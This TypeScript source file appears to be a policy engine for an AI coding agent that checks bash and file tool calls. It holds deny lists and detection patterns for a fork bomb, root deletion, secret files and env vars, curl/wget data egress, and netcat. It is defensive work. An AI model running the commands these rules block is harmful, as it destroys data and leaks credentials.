/**
 * Policy engine — evaluates tool calls against rule data + heuristics.
 *
 * Effective order in evaluateWithRules():
 * 1. Reserved guards (policy.* always ask)
 * 2. Heuristics-as-code
 * 3. User rules (deny-first, then most-specific)
 * 4. Read-only bash auto-allow (no matching rule)
 * 5. Default policy fallback
 */

import { globMatch } from "./glob.js";
import {
  readFileSync,
  writeFileSync,
  statSync,
  appendFileSync,
  existsSync,
  realpathSync,
} from "node:fs";
import { homedir } from "node:os";
import { join, resolve as pathResolve, normalize as pathNormalize } from "node:path";
import type { Rule, RuleInput } from "./rules.js";
import type {
  PolicyConfig as DeclarativePolicyConfig,
  PolicyPermission as DeclarativePolicyPermission,
} from "./types.js";

// ─── Types ───

export type PolicyAction = "allow" | "ask" | "deny";

export interface PolicyRule {
  tool?: string; // "bash" | "write" | "edit" | "read" | "*"
  exec?: string; // For bash: executable name ("git", "rm", "sudo")
  pattern?: string; // Glob against command or path
  pathWithin?: string; // Path must be inside this directory
  domain?: string; // Host/domain matcher
  action: PolicyAction;
  label?: string;
}

/** Resolved heuristic actions (false = disabled). */
interface ResolvedHeuristics {
  pipeToShell: PolicyAction | false;
  dataEgress: PolicyAction | false;
  secretEnvInUrl: PolicyAction | false;
  secretFileAccess: PolicyAction | false;
}

interface CompiledPolicy {
  name: string;
  hardDeny: PolicyRule[];
  rules: PolicyRule[];
  defaultAction: PolicyAction;
  heuristics: ResolvedHeuristics;
}

export interface PolicyDecision {
  action: PolicyAction;
  reason: string;
  layer:
    | "hard_deny"
    | "learned_deny"
    | "session_rule"
    | "workspace_rule"
    | "global_rule"
    | "rule"
    | "default";
  ruleLabel?: string;
  ruleId?: string; // ID of the learned rule that matched (if any)
}

export interface ResolutionOptions {
  allowSession: boolean;
  allowAlways: boolean;
  alwaysDescription?: string;
  denyAlways: boolean;
}

export interface GateRequest {
  tool: string;
  input: Record<string, unknown>;
  toolCallId: string;
}

// ─── Bash Command Parsing ───

export interface ParsedCommand {
  executable: string;
  args: string[];
  raw: string;
  hasPipe: boolean;
  hasRedirect: boolean;
  hasSubshell: boolean;
}

/**
 * Parse a bash command string into structured form.
 * Not a full shell parser — handles the common cases for policy matching.
 */
export function parseBashCommand(command: string): ParsedCommand {
  const raw = command.trim();
  const hasPipe = /(?<![\\])\|/.test(raw);
  const hasRedirect = /(?<![\\])[><]/.test(raw);
  const hasSubshell = /\$\(/.test(raw) || /`[^`]+`/.test(raw);

  // Split on first whitespace to get executable
  // Handle leading env vars (VAR=val cmd ...) and command prefixes
  let cmdPart = raw;

  // Strip leading env assignments (FOO=bar BAZ=qux cmd ...)
  while (/^\w+=\S+\s/.test(cmdPart)) {
    cmdPart = cmdPart.replace(/^\w+=\S+\s+/, "");
  }

  // Handle common prefixes. Some (nice, env) take their own flags
  // before the actual command, so strip those too.
  const simplePrefixes = ["command", "builtin", "nohup", "time"];
  for (const prefix of simplePrefixes) {
    if (cmdPart.startsWith(prefix + " ")) {
      cmdPart = cmdPart.slice(prefix.length).trimStart();
    }
  }

  // env can have VAR=val or flags before the command
  if (cmdPart.startsWith("env ")) {
    cmdPart = cmdPart.slice(4).trimStart();
    // Strip env's own flags and VAR=val assignments
    while (/^(-\S+\s+|\w+=\S+\s+)/.test(cmdPart)) {
      cmdPart = cmdPart.replace(/^(-\S+\s+|\w+=\S+\s+)/, "").trimStart();
    }
  }

  // nice takes optional -n <priority> before the command
  if (cmdPart.startsWith("nice ")) {
    cmdPart = cmdPart.slice(5).trimStart();
    // Strip -n <num> or --adjustment=<num>
    cmdPart = cmdPart.replace(/^(-n\s+\S+\s+|--adjustment=\S+\s+|-\d+\s+)/, "").trimStart();
  }

  // Split into tokens (basic: split on whitespace, respect quotes)
  const tokens = tokenize(cmdPart);
  const executable = tokens[0] || raw;
  const args = tokens.slice(1);

  return { executable, args, raw, hasPipe, hasRedirect, hasSubshell };
}

/**
 * Match a bash command string against a glob-like pattern.
 *
 * Unlike minimatch (designed for file paths where '*' doesn't cross '/'),
 * this treats the command as a flat string where '*' matches any characters
 * including '/'. This ensures 'rm *-*r*' matches 'rm -rf /tmp/foo'.
 *
 * Supports: '*' (match anything), literal characters.
 * Does NOT support: '?', '**', character classes.
 */
export function matchBashPattern(command: string, pattern: string): boolean {
  // Simple glob matching without regex — avoids ReDoS entirely.
  // Splits the pattern on '*' into literal segments and checks that
  // they appear in order within the command string.
  //
  // Example: "rm *-*r*" splits into ["rm ", "-", "r", ""]
  // Then checks: command starts with "rm ", then "-" appears after,
  // then "r" appears after that.

  if (command.length > 10000) {
    // Safety: extremely long commands get a simple prefix check
    return command.startsWith(pattern.split("*")[0]);
  }

  const segments = pattern.split("*");
  let pos = 0;

  for (let i = 0; i < segments.length; i++) {
    const seg = segments[i];
    if (seg === "") continue;

    if (i === 0) {
      // First segment must match at the start
      if (!command.startsWith(seg)) return false;
      pos = seg.length;
    } else if (i === segments.length - 1) {
      // Last segment must match at the end
      if (!command.endsWith(seg)) return false;
      // Also ensure it's after current position
      const lastIdx = command.lastIndexOf(seg);
      if (lastIdx < pos) return false;
    } else {
      // Middle segments must appear in order
      const idx = command.indexOf(seg, pos);
      if (idx === -1) return false;
      pos = idx + seg.length;
    }
  }

  return true;
}

/**
 * Basic shell tokenizer — splits on whitespace, respects single/double quotes.
 */
function tokenize(input: string): string[] {
  const tokens: string[] = [];
  let current = "";
  let inSingle = false;
  let inDouble = false;
  let escaped = false;

  for (const ch of input) {
    if (escaped) {
      current += ch;
      escaped = false;
      continue;
    }
    if (ch === "\\") {
      escaped = true;
      continue;
    }
    if (ch === "'" && !inDouble) {
      inSingle = !inSingle;
      continue;
    }
    if (ch === '"' && !inSingle) {
      inDouble = !inDouble;
      continue;
    }
    if ((ch === " " || ch === "\t") && !inSingle && !inDouble) {
      if (current) {
        tokens.push(current);
        current = "";
      }
      continue;
    }
    current += ch;
  }
  if (current) tokens.push(current);
  return tokens;
}

/**
 * Split a shell command chain into top-level segments.
 *
 * Handles separators outside of quotes:
 *   - &&
 *   - ||
 *   - ;
 *   - newlines
 *
 * Keeps quoted/escaped separators intact.
 */
export function splitBashCommandChain(command: string): string[] {
  const segments: string[] = [];
  let current = "";
  let inSingle = false;
  let inDouble = false;
  let escaped = false;

  const pushCurrent = () => {
    const trimmed = current.trim();
    if (trimmed) segments.push(trimmed);
    current = "";
  };

  for (let i = 0; i < command.length; i++) {
    const ch = command[i];
    const next = command[i + 1];

    if (escaped) {
      current += ch;
      escaped = false;
      continue;
    }

    if (ch === "\\") {
      current += ch;
      escaped = true;
      continue;
    }

    if (ch === "'" && !inDouble) {
      inSingle = !inSingle;
      current += ch;
      continue;
    }

    if (ch === '"' && !inSingle) {
      inDouble = !inDouble;
      current += ch;
      continue;
    }

    if (!inSingle && !inDouble) {
      if (ch === "&" && next === "&") {
        pushCurrent();
        i += 1;
        continue;
      }

      if (ch === "|" && next === "|") {
        pushCurrent();
        i += 1;
        continue;
      }

      if (ch === ";" || ch === "\n") {
        pushCurrent();
        continue;
      }
    }

    current += ch;
  }

  pushCurrent();

  return segments.length > 0 ? segments : [command.trim()].filter(Boolean);
}

const CHAIN_HELPER_EXECUTABLES = new Set(["cd", "echo", "pwd", "true", "false", ":", "#"]);
const FILE_PATH_TOOLS = new Set(["read", "write", "edit", "find", "ls"]);

const READ_ONLY_INSPECTION_EXECUTABLES = new Set([
  "cat",
  "grep",
  "rg",
  "find",
  "ls",
  "head",
  "tail",
  "wc",
]);

const FIND_MUTATING_FLAGS = new Set([
  "-exec",
  "-execdir",
  "-ok",
  "-okdir",
  "-delete",
  "-fprint",
  "-fprintf",
  "-fls",
]);

function executableName(raw: string): string {
  return raw.includes("/") ? raw.split("/").pop() || raw : raw;
}

function normalizePathInput(rawPath: string): { rawNormalized: string; resolvedRealpath?: string } {
  const expanded = rawPath.replace(/^~(?=$|\/)/, homedir());
  const rawNormalized = pathNormalize(pathResolve(expanded));

  try {
    if (existsSync(rawNormalized)) {
      return { rawNormalized, resolvedRealpath: realpathSync(rawNormalized) };
    }
  } catch {
    // Best-effort only — use normalized raw path.
  }

  return { rawNormalized };
}

function literalPrefixLength(pattern: string): number {
  let length = 0;
  for (let i = 0; i < pattern.length; i++) {
    const ch = pattern[i];
    if (ch === "*" || ch === "?" || ch === "[" || ch === "{") {
      break;
    }
    length += 1;
  }
  return length;
}

function matcherTypeRank(rule: Rule): number {
  if (rule.pattern && rule.executable) return 3;
  if (rule.pattern) return 2;
  if (rule.executable) return 1;
  return 0;
}

// ─── Data Egress Detection ───

/**
 * Flags on curl/wget that indicate outbound data transfer.
 * Matches short flags (-d, -F, -T) and long flags (--data, --form, etc.).
 */
const CURL_DATA_FLAGS = new Set([
  "-d",
  "--data",
  "--data-raw",
  "--data-binary",
  "--data-urlencode",
  "-F",
  "--form",
  "--form-string",
  "-T",
  "--upload-file",
  "--json",
]);

const CURL_WRITE_METHODS = new Set(["POST", "PUT", "DELETE", "PATCH"]);

const WGET_DATA_FLAGS = new Set(["--post-data", "--post-file"]);

const SECRET_ENV_HINTS = ["KEY", "TOKEN", "SECRET", "PASSWORD", "CREDENTIAL", "AUTH"];

const SECRET_FILE_READ_EXECUTABLES = new Set([
  "cat",
  "head",
  "tail",
  "less",
  "more",
  "grep",
  "rg",
  "awk",
  "sed",
]);

/**
 * Split a command segment into pipeline stages.
 *
 * Handles unescaped `|` outside quotes. Keeps quoted/escaped pipes intact.
 */
export function splitPipelineStages(segment: string): string[] {
  const stages: string[] = [];
  let current = "";
  let inSingle = false;
  let inDouble = false;
  let escaped = false;

  const pushCurrent = () => {
    const trimmed = current.trim();
    if (trimmed) stages.push(trimmed);
    current = "";
  };

  for (let i = 0; i < segment.length; i++) {
    const ch = segment[i];
    const next = segment[i + 1];

    if (escaped) {
      current += ch;
      escaped = false;
      continue;
    }

    if (ch === "\\") {
      current += ch;
      escaped = true;
      continue;
    }

    if (ch === "'" && !inDouble) {
      inSingle = !inSingle;
      current += ch;
      continue;
    }

    if (ch === '"' && !inSingle) {
      inDouble = !inDouble;
      current += ch;
      continue;
    }

    if (!inSingle && !inDouble && ch === "|" && next !== "|") {
      pushCurrent();
      continue;
    }

    current += ch;
  }

  pushCurrent();
  return stages.length > 0 ? stages : [segment.trim()].filter(Boolean);
}

function isLikelySecretEnvName(envName: string): boolean {
  const upper = envName.toUpperCase();
  return SECRET_ENV_HINTS.some((hint) => upper.includes(hint));
}

/**
 * Detect likely secret env expansion in curl/wget URL arguments.
 *
 * Example: curl "https://x.test/?token=$OPENAI_API_KEY"
 */
export function hasSecretEnvExpansionInUrl(parsed: ParsedCommand): boolean {
  if (parsed.executable !== "curl" && parsed.executable !== "wget") return false;

  const envRef = /\$(?:\{([A-Za-z_][A-Za-z0-9_]*)\}|([A-Za-z_][A-Za-z0-9_]*))/g;

  for (const arg of parsed.args) {
    const lowerArg = arg.toLowerCase();
    if (!lowerArg.includes("http://") && !lowerArg.includes("https://")) continue;

    let match: RegExpExecArray | null;
    while ((match = envRef.exec(arg)) !== null) {
      const envName = match[1] || match[2];
      if (envName && isLikelySecretEnvName(envName)) {
        return true;
      }
    }
  }

  return false;
}

/**
 * Directories that always contain secret material.
 * Matches both absolute paths (/.ssh/) and home-relative (~/.ssh/).
 */
const SECRET_DIRS = ["ssh", "aws", "gnupg", "docker", "kube", "azure"];

/**
 * Config subdirectories that contain secret material.
 * Matched under ~/.config/NAME/ or PATH/.config/NAME/
 */
const SECRET_CONFIG_DIRS = [
  "gh", // GitHub CLI tokens (hosts.yml)
  "gcloud", // GCP credentials
];

/**
 * Specific dotfiles in the home directory that contain credentials.
 * Matched as exact filenames at the end of a path.
 */
const SECRET_DOTFILES = [
  ".npmrc", // npm auth tokens
  ".netrc", // login credentials for curl/wget/ftp
  ".pypirc", // PyPI upload tokens
];

function isSecretPath(pathCandidate: string): boolean {
  const normalized = pathCandidate
    .trim()
    .replace(/^['"]|['"]$/g, "")
    .toLowerCase();

  if (!normalized || normalized === "-" || normalized.startsWith("-")) return false;

  // Secret directories: ~/.ssh/, ~/.aws/, ~/.docker/, etc.
  for (const dir of SECRET_DIRS) {
    if (
      normalized.includes(`/.${dir}/`) ||
      normalized.startsWith(`~/.${dir}/`) ||
      normalized.endsWith(`/.${dir}`) ||
      normalized === `~/.${dir}`
    ) {
      return true;
    }
  }

  // Secret config subdirectories: ~/.config/gh/, ~/.config/gcloud/, etc.
  for (const dir of SECRET_CONFIG_DIRS) {
    if (
      normalized.includes(`/.config/${dir}/`) ||
      normalized.startsWith(`~/.config/${dir}/`) ||
      normalized.endsWith(`/.config/${dir}`) ||
      normalized === `~/.config/${dir}`
    ) {
      return true;
    }
  }

  // Secret dotfiles: ~/.npmrc, ~/.netrc, ~/.pypirc
  for (const file of SECRET_DOTFILES) {
    if (normalized.endsWith(`/${file}`) || normalized === `~/${file}` || normalized === file) {
      return true;
    }
  }

  // .env files (various patterns)
  return (
    normalized === ".env" ||
    normalized.startsWith(".env.") ||
    normalized.endsWith("/.env") ||
    normalized.includes("/.env.")
  );
}

/**
 * Extract command substitution contents from a command string.
 *
 * Matches both $(cmd) and `cmd` forms. Not recursive — extracts
 * the outermost substitutions only.
 */
export function extractCommandSubstitutions(command: string): string[] {
  const subs: string[] = [];

  // Match $(...) — handle nested parens with a simple depth counter
  let i = 0;
  while (i < command.length) {
    if (command[i] === "$" && command[i + 1] === "(") {
      let depth = 1;
      const start = i + 2;
      let j = start;
      while (j < command.length && depth > 0) {
        if (command[j] === "(") depth++;
        else if (command[j] === ")") depth--;
        j++;
      }
      if (depth === 0) {
        subs.push(command.slice(start, j - 1));
      }
      i = j;
    } else {
      i++;
    }
  }

  // Match `cmd` (backtick form)
  const backtickRe = /`([^`]+)`/g;
  let m: RegExpExecArray | null;
  while ((m = backtickRe.exec(command)) !== null) {
    subs.push(m[1]);
  }

  return subs;
}

/**
 * Check if a raw command string (including embedded substitutions)
 * references secret file paths.
 *
 * Scans both the command arguments directly and any $() / `` contents.
 */
export function hasSecretFileReference(command: string): boolean {
  // Direct check: scan for secret paths anywhere in the command text.
  // This catches both top-level args and embedded substitutions.
  const subs = extractCommandSubstitutions(command);

  for (const sub of subs) {
    // Parse the substitution as a command and check for secret file reads
    const stages = splitPipelineStages(sub);
    for (const stage of stages) {
      const parsed = parseBashCommand(stage);
      if (isSecretFileRead(parsed)) return true;
    }
  }

  return false;
}

/**
 * Detect direct secret-file reads via common file-reading commands.
 */
export function isSecretFileRead(parsed: ParsedCommand): boolean {
  const executable = parsed.executable.includes("/")
    ? parsed.executable.split("/").pop() || parsed.executable
    : parsed.executable;

  if (!SECRET_FILE_READ_EXECUTABLES.has(executable)) return false;

  return parsed.args.some((arg) => isSecretPath(arg));
}

/**
 * Detect if a parsed command sends data to an external service.
 *
 * Checks for curl/wget with data-sending flags or explicit write methods.
 * Does NOT flag simple GET requests (curl https://example.com) — those
 * are reads, not external actions on the user's behalf.
 */
export function isDataEgress(parsed: ParsedCommand): boolean {
  if (parsed.executable === "curl") {
    for (let i = 0; i < parsed.args.length; i++) {
      const arg = parsed.args[i];

      // Exact flag match: -d, --data, -F, --json, etc.
      if (CURL_DATA_FLAGS.has(arg)) return true;

      // Long flag with = : --data=value, --json=value
      const eqIdx = arg.indexOf("=");
      if (eqIdx > 0 && CURL_DATA_FLAGS.has(arg.slice(0, eqIdx))) return true;

      // Explicit write method: -X POST, --request PUT, -XPOST (no space)
      if (arg === "-X" || arg === "--request") {
        const next = parsed.args[i + 1]?.toUpperCase();
        if (next && CURL_WRITE_METHODS.has(next)) return true;
      }
      // Compact form: -XPOST, -XPUT, etc.
      if (arg.startsWith("-X") && arg.length > 2) {
        const method = arg.slice(2).toUpperCase();
        if (CURL_WRITE_METHODS.has(method)) return true;
      }
    }
    return false;
  }

  if (parsed.executable === "wget") {
    for (const arg of parsed.args) {
      if (WGET_DATA_FLAGS.has(arg)) return true;
      const eqIdx = arg.indexOf("=");
      if (eqIdx > 0 && WGET_DATA_FLAGS.has(arg.slice(0, eqIdx))) return true;
    }
    return false;
  }

  return false;
}

// ─── Shared Domain Allowlist ───

/**
 * Path to the shared fetch domain allowlist.
 *
 * Format: one domain per line. Supports:
 *   example.com              — exact domain + subdomains
 *   github.com/org           — github.com scoped to org (ignored here, treated as github.com)
 *   github.com/owner/repo    — scoped (ignored here, treated as github.com)
 *   # comments and blank lines
 */
const FETCH_ALLOWLIST_PATH = join(homedir(), ".config", "fetch", "allowed_domains.txt");

/** Cached allowlist. Loaded once at module init, reloaded on PolicyEngine construction. */
let _cachedAllowedDomains: Set<string> | null = null;
let _cachedAllowlistMtime: number = 0;

/**
 * Load the shared fetch domain allowlist.
 *
 * Extracts bare domains from entries like "github.com/org/repo" → "github.com".
 * Returns a Set of lowercase domains.
 */
export function loadFetchAllowlist(overridePath?: string): Set<string> {
  const filePath = overridePath || FETCH_ALLOWLIST_PATH;
  try {
    // Only use cache for the default path
    if (!overridePath) {
      const { mtimeMs } = statSync(filePath);
      if (_cachedAllowedDomains && mtimeMs === _cachedAllowlistMtime) {
        return _cachedAllowedDomains;
      }
    }

    const content = readFileSync(filePath, "utf-8");
    const domains = new Set<string>();

    for (const line of content.split("\n")) {
      const trimmed = line.trim();
      if (!trimmed || trimmed.startsWith("#")) continue;

      // Extract the domain part (strip path components like /org/repo)
      // "github.com/anthropics" → "github.com"
      // "docs.python.org" → "docs.python.org"
      const slashIdx = trimmed.indexOf("/");
      const domain = slashIdx > 0 ? trimmed.slice(0, slashIdx) : trimmed;
      domains.add(domain.toLowerCase());
    }

    if (!overridePath) {
      const { mtimeMs } = statSync(filePath);
      _cachedAllowedDomains = domains;
      _cachedAllowlistMtime = mtimeMs;
    }
    return domains;
  } catch {
    // File doesn't exist or unreadable — empty allowlist
    return new Set();
  }
}

/**
 * Check if a hostname is in the shared fetch allowlist.
 * Matches exact domain or parent domain (docs.python.org matches "python.org" entry too,
 * and "mail.google.com" matches "google.com" entry).
 */
function isInFetchAllowlist(hostname: string): boolean {
  const allowlist = loadFetchAllowlist();
  const lower = hostname.toLowerCase();

  // Exact match
  if (allowlist.has(lower)) return true;

  // Check parent domains: "sub.example.com" matches "example.com"
  const parts = lower.split(".");
  for (let i = 1; i < parts.length - 1; i++) {
    const parent = parts.slice(i).join(".");
    if (allowlist.has(parent)) return true;
  }

  return false;
}

// ─── Domain Allowlist Management ───

/**
 * Add a domain to the shared fetch allowlist.
 * No-op if the domain is already present.
 * Invalidates the in-memory cache.
 */
export function addDomainToAllowlist(domain: string, allowlistPath?: string): void {
  const path = allowlistPath || FETCH_ALLOWLIST_PATH;
  const lower = domain.toLowerCase().trim();
  if (!lower) return;

  // Check if already present
  const existing = loadFetchAllowlist(path);
  if (existing.has(lower)) return;

  // Append to file
  try {
    const content = existsSync(path) ? readFileSync(path, "utf-8") : "";
    const needsNewline = content.length > 0 && !content.endsWith("\n");
    appendFileSync(path, (needsNewline ? "\n" : "") + lower + "\n", { mode: 0o644 });

    // Invalidate cache
    _cachedAllowedDomains = null;
    _cachedAllowlistMtime = 0;
  } catch (err) {
    console.error(`[policy] Failed to add domain to allowlist: ${err}`);
  }
}

/**
 * Remove a domain from the shared fetch allowlist.
 * Preserves comments and blank lines.
 * Invalidates the in-memory cache.
 */
export function removeDomainFromAllowlist(domain: string, allowlistPath?: string): void {
  const path = allowlistPath || FETCH_ALLOWLIST_PATH;
  const lower = domain.toLowerCase().trim();
  if (!lower) return;

  if (!existsSync(path)) return;

  try {
    const content = readFileSync(path, "utf-8");
    const lines = content.split("\n");
    const filtered = lines.filter((line) => {
      const trimmed = line.trim().toLowerCase();
      // Preserve comments and blanks
      if (!trimmed || trimmed.startsWith("#")) return true;
      // Remove exact match (strip /path suffix for comparison)
      const slashIdx = trimmed.indexOf("/");
      const lineDomain = slashIdx > 0 ? trimmed.slice(0, slashIdx) : trimmed;
      return lineDomain !== lower;
    });
    writeFileSync(path, filtered.join("\n"), { mode: 0o644 });

    // Invalidate cache
    _cachedAllowedDomains = null;
    _cachedAllowlistMtime = 0;
  } catch (err) {
    console.error(`[policy] Failed to remove domain from allowlist: ${err}`);
  }
}

/**
 * List all domains in the shared fetch allowlist.
 * Returns sorted unique domains (strips path suffixes).
 */
export function listAllowlistDomains(allowlistPath?: string): string[] {
  const domains = loadFetchAllowlist(allowlistPath);
  return Array.from(domains).sort();
}

// ─── Default Rule Presets ───

/**
 * Editable global presets seeded into rules.json on first run.
 * These are convenience defaults, not an immutable security boundary.
 */
export function defaultPresetRules(): RuleInput[] {
  return [
    {
      tool: "bash",
      decision: "deny",
      executable: "sudo",
      label: "Block sudo",
      scope: "global",
      source: "preset",
    },
    {
      tool: "bash",
      decision: "deny",
      pattern: "*auth.json*",
      label: "Protect API keys",
      scope: "global",
      source: "preset",
    },
    {
      tool: "bash",
      decision: "deny",
      pattern: "*printenv*_KEY*",
      label: "Protect env secrets",
      scope: "global",
      source: "preset",
    },
    {
      tool: "bash",
      decision: "deny",
      pattern: "*printenv*_TOKEN*",
      label: "Protect env tokens",
      scope: "global",
      source: "preset",
    },
    {
      tool: "read",
      decision: "deny",
      pattern: "**/.ssh/id_*",
      label: "Protect SSH keys",
      scope: "global",
      source: "preset",
    },
    {
      tool: "bash",
      decision: "deny",
      pattern: "*:(){ :|:& };*",
      label: "Block fork bomb",
      scope: "global",
      source: "preset",
    },
    {
      tool: "bash",
      decision: "ask",
      executable: "git",
      pattern: "git push*",
      label: "Git push",
      scope: "global",
      source: "preset",
    },
    {
      tool: "bash",
      decision: "ask",
      executable: "rm",
      pattern: "rm *-*r*",
      label: "Recursive delete",
      scope: "global",
      source: "preset",
    },
    {
      tool: "bash",
      decision: "ask",
      executable: "ssh",
      label: "SSH connection",
      scope: "global",
      source: "preset",
    },
  ];
}

// ─── Default Policy Config ───

/**
 * Default policy configuration for new servers.
 *
 * Philosophy: allow most local dev work, ask for external/destructive actions,
 * block credential exfiltration and privilege escalation.
 *
 * Structural heuristics (pipe-to-shell, data egress, secret checks)
 * are always active in evaluate() regardless of this config.
 */
export function defaultPolicy(): DeclarativePolicyConfig {
  return {
    schemaVersion: 1,
    mode: "default",
    description:
      "Developer-friendly defaults: allow local work, ask for external/destructive actions, block credential exfiltration.",
    fallback: "allow",
    guardrails: [
      // ── Privilege escalation ──
      {
        id: "block-sudo",
        decision: "block",
        label: "Block sudo",
        reason: "Prevents privilege escalation",
        immutable: true,
        match: { tool: "bash", executable: "sudo" },
      },
      {
        id: "block-doas",
        decision: "block",
        label: "Block doas",
        reason: "Prevents privilege escalation",
        immutable: true,
        match: { tool: "bash", executable: "doas" },
      },
      {
        id: "block-su-root",
        decision: "block",
        label: "Block su root",
        reason: "Prevents privilege escalation",
        immutable: true,
        match: { tool: "bash", commandMatches: "su -*root*" },
      },

      // ── Credential exfiltration ──
      {
        id: "block-auth-json-bash",
        decision: "block",
        label: "Protect API keys (bash)",
        reason: "Prevents reading auth.json via bash",
        immutable: true,
        match: { tool: "bash", commandMatches: "*auth.json*" },
      },
      {
        id: "block-auth-json-read",
        decision: "block",
        label: "Protect API keys (read)",
        reason: "Prevents reading auth.json via read tool",
        immutable: true,
        match: { tool: "read", pathMatches: "**/agent/auth.json" },
      },
      {
        id: "block-printenv-key",
        decision: "block",
        label: "Protect env secrets (_KEY)",
        reason: "Prevents leaking API keys from env",
        immutable: true,
        match: { tool: "bash", commandMatches: "*printenv*_KEY*" },
      },
      {
        id: "block-printenv-secret",
        decision: "block",
        label: "Protect env secrets (_SECRET)",
        reason: "Prevents leaking secrets from env",
        immutable: true,
        match: { tool: "bash", commandMatches: "*printenv*_SECRET*" },
      },
      {
        id: "block-printenv-token",
        decision: "block",
        label: "Protect env secrets (_TOKEN)",
        reason: "Prevents leaking tokens from env",
        immutable: true,
        match: { tool: "bash", commandMatches: "*printenv*_TOKEN*" },
      },
      {
        id: "block-ssh-keys",
        decision: "block",
        label: "Block SSH private key reads",
        reason: "Prevents reading SSH private keys",
        immutable: true,
        match: { tool: "read", pathMatches: "**/.ssh/id_*" },
      },

      // ── Catastrophic operations ──
      {
        id: "block-root-rm",
        decision: "block",
        label: "Block destructive root delete",
        reason: "Prevents catastrophic filesystem deletion",
        immutable: true,
        match: { tool: "bash", executable: "rm", commandMatches: "rm -rf /*" },
      },
      {
        id: "block-fork-bomb",
        decision: "block",
        label: "Block fork bomb",
        reason: "Prevents fork bomb denial of service",
        immutable: true,
        match: { tool: "bash", commandMatches: "*:(){ :|:& };*" },
      },
    ],
    permissions: [
      // ── Destructive local operations → ask ──
      {
        id: "ask-rm-recursive",
        decision: "ask",
        label: "Recursive delete",
        match: { tool: "bash", executable: "rm", commandMatches: "rm *-*r*" },
      },
      {
        id: "ask-rm-force",
        decision: "ask",
        label: "Force delete",
        match: { tool: "bash", executable: "rm", commandMatches: "rm *-*f*" },
      },

      // ── Git external operations → ask ──
      {
        id: "ask-git-push",
        decision: "ask",
        label: "Git push",
        match: { tool: "bash", executable: "git", commandMatches: "git push*" },
      },

      // ── Package publishing → ask ──
      {
        id: "ask-npm-publish",
        decision: "ask",
        label: "npm publish",
        match: { tool: "bash", executable: "npm", commandMatches: "npm publish*" },
      },
      {
        id: "ask-yarn-publish",
        decision: "ask",
        label: "yarn publish",
        match: { tool: "bash", executable: "yarn", commandMatches: "yarn publish*" },
      },
      {
        id: "ask-pypi-upload",
        decision: "ask",
        label: "PyPI upload",
        match: { tool: "bash", executable: "twine", commandMatches: "twine upload*" },
      },

      // ── Remote access → ask ──
      {
        id: "ask-ssh",
        decision: "ask",
        label: "SSH connection",
        match: { tool: "bash", executable: "ssh" },
      },
      {
        id: "ask-scp",
        decision: "ask",
        label: "SCP transfer",
        match: { tool: "bash", executable: "scp" },
      },
      {
        id: "ask-sftp",
        decision: "ask",
        label: "SFTP transfer",
        match: { tool: "bash", executable: "sftp" },
      },

      // ── Raw sockets → ask ──
      {
        id: "ask-nc",
        decision: "ask",
        label: "Netcat connection",
        match: { tool: "bash", executable: "nc" },
      },
      {
        id: "ask-ncat",
        decision: "ask",
        label: "Netcat connection",
        match: { tool: "bash", executable: "ncat" },
      },
      {
        id: "ask-socat",
        decision: "ask",
        label: "Socket relay",
        match: { tool: "bash", executable: "socat" },
      },
      {
        id: "ask-telnet",
        decision: "ask",
        label: "Telnet connection",
        match: { tool: "bash", executable: "telnet" },
      },

      // ── Local machine control → ask ──
      {
        id: "ask-build-install",
        decision: "ask",
        label: "Reinstall iOS app",
        match: { tool: "bash", commandMatches: "*scripts/build-install.sh*" },
      },
      {
        id: "ask-xcrun-install",
        decision: "ask",
        label: "Install app on physical device",
        match: {
          tool: "bash",
          executable: "xcrun",
          commandMatches: "xcrun devicectl device install app*",
        },
      },
      {
        id: "ask-ios-dev-up",
        decision: "ask",
        label: "Restart server and deploy app",
        match: { tool: "bash", commandMatches: "*scripts/ios-dev-up.sh*" },
      },
    ],
    heuristics: {
      pipeToShell: "ask",
      dataEgress: "ask",
      secretEnvInUrl: "ask",
      secretFileAccess: "block",
    },
  };
}

/** Default heuristic settings (used when heuristics field is omitted from config). */
const DEFAULT_HEURISTICS: ResolvedHeuristics = {
  pipeToShell: "ask",
  dataEgress: "ask",
  secretEnvInUrl: "ask",
  secretFileAccess: "deny",
};

// ── Legacy: kept only for test compatibility ──
const BUILTIN_CONTAINER_POLICY: CompiledPolicy = {
  name: "container",
  hardDeny: [
    // Privilege escalation — can't escape container, but deny on principle
    { tool: "bash", exec: "sudo", action: "deny", label: "No sudo" },
    { tool: "bash", exec: "doas", action: "deny", label: "No doas" },
    { tool: "bash", pattern: "su -*root*", action: "deny", label: "No su root" },

    // Credential exfiltration — API keys are synced into ~/.pi/agent/auth.json
    {
      tool: "bash",
      pattern: "*auth.json*",
      action: "deny",
      label: "Protect API keys",
    },
    {
      tool: "read",
      pattern: "**/agent/auth.json",
      action: "deny",
      label: "Protect API keys",
    },
    {
      tool: "bash",
      pattern: "*printenv*_KEY*",
      action: "deny",
      label: "Protect env secrets",
    },
    {
      tool: "bash",
      pattern: "*printenv*_SECRET*",
      action: "deny",
      label: "Protect env secrets",
    },
    {
      tool: "bash",
      pattern: "*printenv*_TOKEN*",
      action: "deny",
      label: "Protect env secrets",
    },

    // Fork bomb
    {
      tool: "bash",
      pattern: "*:(){ :|:& };*",
      action: "deny",
      label: "Fork bomb",
    },
  ],
  rules: [
    // ── External actions → ask ──
    // Anything that acts on the user's behalf on external services.
    // The user sees these on their phone and approves/denies.
    //
    // Data egress (curl/wget with data flags) is matched structurally
    // in evaluate(), not here. Same for pipe-to-shell.

    // Git write operations (push to remotes)
    {
      tool: "bash",
      exec: "git",
      pattern: "git push*",
      action: "ask",
      label: "Git push",
    },
    {
      tool: "bash",
      exec: "git",
      pattern: "git remote *add*",
      action: "ask",
      label: "Add git remote",
    },
    {
      tool: "bash",
      exec: "git",
      pattern: "git remote *set-url*",
      action: "ask",
      label: "Change git remote",
    },

    // Package publishing
    {
      tool: "bash",
      exec: "npm",
      pattern: "npm publish*",
      action: "ask",
      label: "npm publish",
    },
    {
      tool: "bash",
      exec: "npx",
      pattern: "npx *publish*",
      action: "ask",
      label: "npm publish",
    },
    {
      tool: "bash",
      exec: "yarn",
      pattern: "yarn publish*",
      action: "ask",
      label: "yarn publish",
    },
    {
      tool: "bash",
      exec: "pip",
      pattern: "pip *upload*",
      action: "ask",
      label: "pip upload",
    },
    {
      tool: "bash",
      exec: "twine",
      pattern: "twine upload*",
      action: "ask",
      label: "PyPI upload",
    },

    // Remote access (always external)
    { tool: "bash", exec: "ssh", action: "ask", label: "SSH connection" },
    { tool: "bash", exec: "scp", action: "ask", label: "SCP transfer" },
    { tool: "bash", exec: "sftp", action: "ask", label: "SFTP transfer" },
